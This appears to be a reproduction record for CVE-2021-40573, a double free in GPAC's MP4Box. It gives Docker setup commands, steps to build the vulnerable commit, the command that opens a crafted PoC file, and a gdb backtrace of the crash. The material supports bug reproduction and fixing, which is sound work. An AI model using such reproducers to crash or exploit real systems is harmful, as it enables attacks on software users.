### CVE-2021-40573

### PoC Links
[Github.com](https://github.com/gpac/gpac/issues/1891)

### Docker Container Run Command
```shell
docker build -t cve-2021-40573-poc .
docker run --privileged --security-opt seccomp=unconfined -itd --name CVE-2021-40573-POC cve-2021-40573-poc
docker exec -it CVE-2021-40573-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard 592ba2689a3f2fc787371eda490fde4f84e60315

# Install the compilation and installation dependencies.
apt install gcc make gdb zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --static-bin --enable-debug
make
make install

# Open the poc file.
MP4Box -info /poc/mp4box-abrt-doublefree_alloc165
```

### Description
Observed that:
```shell
root@1279c9945a63:/poc/gpac# gdb MP4Box
...

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from MP4Box...
(gdb) r -info /poc/mp4box-abrt-doublefree_alloc165
Starting program: /usr/local/bin/MP4Box -info /poc/mp4box-abrt-doublefree_alloc165
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/aarch64-linux-gnu/libthread_db.so.1".
[isom] not enough bytes in box iloc: 0 left, reading 3 (file isomedia/box_code_meta.c, line 303)
free(): invalid pointer

Program received signal SIGABRT, Aborted.
0x0000000000b73280 in __pthread_kill_implementation.constprop.0 ()
(gdb) bt
#0  0x0000000000b73280 in __pthread_kill_implementation.constprop.0 ()
#1  0x0000000000b51c2c in raise ()
#2  0x0000000000400424 in abort ()
#3  0x0000000000b6adb0 in __libc_message ()
#4  0x0000000000b7728c in malloc_printerr ()
#5  0x0000000000b78fd4 in _int_free ()
#6  0x0000000000b7ba5c in free ()
#7  0x0000000000452560 in gf_free (ptr=0x31a4c97) at utils/alloc.c:165
#8  0x0000000000442a04 in gf_list_del (ptr=0x31a7d70) at utils/list.c:614
#9  0x0000000000a1930c in iloc_entry_del (location=0x3183df0) at isomedia/box_code_meta.c:244
#10 0x0000000000a19374 in iloc_box_del (s=0xe00bd0) at isomedia/box_code_meta.c:256
#11 0x00000000005992ac in gf_isom_box_del (a=0xe00bd0) at isomedia/box_funcs.c:1794
#12 0x0000000000597c30 in gf_isom_box_parse_ex (outBox=0xffffffffab40, bs=0xe00050, parent_type=0, is_root_box=GF_TRUE)
at isomedia/box_funcs.c:303
#13 0x0000000000596f48 in gf_isom_parse_root_box (outBox=0xffffffffab40, bs=0xe00050, box_type=0x0, bytesExpected=0xffffffffac28,
progressive_mode=GF_FALSE) at isomedia/box_funcs.c:38
#14 0x00000000005a1b44 in gf_isom_parse_movie_boxes_internal (mov=0xdffe30, boxType=0x0, bytesMissing=0xffffffffac28,
progressive_mode=GF_FALSE) at isomedia/isom_intern.c:320
#15 0x00000000005a324c in gf_isom_parse_movie_boxes (mov=0xdffe30, boxType=0x0, bytesMissing=0xffffffffac28,
progressive_mode=GF_FALSE) at isomedia/isom_intern.c:781
#16 0x00000000005a35dc in gf_isom_open_file (fileName=0xfffffffff90c "/poc/mp4box-abrt-doublefree_alloc165",
OpenMode=GF_ISOM_OPEN_READ_DUMP, tmp_dir=0x0) at isomedia/isom_intern.c:901
#17 0x00000000005a6550 in gf_isom_open (fileName=0xfffffffff90c "/poc/mp4box-abrt-doublefree_alloc165",
OpenMode=GF_ISOM_OPEN_READ_DUMP, tmp_dir=0x0) at isomedia/isom_read.c:509
#18 0x00000000004140b0 in mp4boxMain (argc=3, argv=0xfffffffff6f8) at main.c:5841
#19 0x0000000000417394 in main (argc=3, argv=0xfffffffff6f8) at main.c:6455
```



